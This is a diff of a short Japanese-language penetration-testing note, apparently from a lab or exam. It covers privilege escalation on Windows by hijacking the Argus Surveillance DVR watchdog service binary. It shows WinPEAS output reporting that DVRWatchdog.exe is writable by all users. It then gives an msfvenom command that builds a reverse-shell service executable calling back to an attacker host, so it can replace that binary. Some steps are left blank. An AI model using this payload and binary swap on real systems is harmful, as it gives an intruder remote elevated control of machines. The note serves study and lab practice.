@@ -1,9 +1,28 @@
 # Argus Surveillance DVR binary hijack
 
-- ペイロード作成
+- WINPEASの結果、DVRWatchdog.exeがサービスとして起動していることを確認
+```powershell
+  =================================================================================================
+
+    Argus Surveillance DVR Watchdog(PY Software - Argus Surveillance DVR Watchdog)[C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe] - Autoload - No quotes and Space detected
+    File Permissions: Users [Allow: AllAccess]
+    Possible DLL Hijacking in binary folder: C:\Program Files\Argus Surveillance DVR (Users [Allow: AllAccess])
+    This program monitors and automatically reboots Argus Surveillance DVR if it's locked-up.
+   =================================================================================================
+```
+
+- また、書き込みが可能なことを確認
 ```sh
 
 ```
+
+- ペイロード作成
+```sh
+┌──(koshi㉿kali)-[~/Exam/Happy]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o DVRWatchdog.exe
+```
+
+- 
 
 - 権限昇格
 ![[Pasted image 20260222160445.png]]
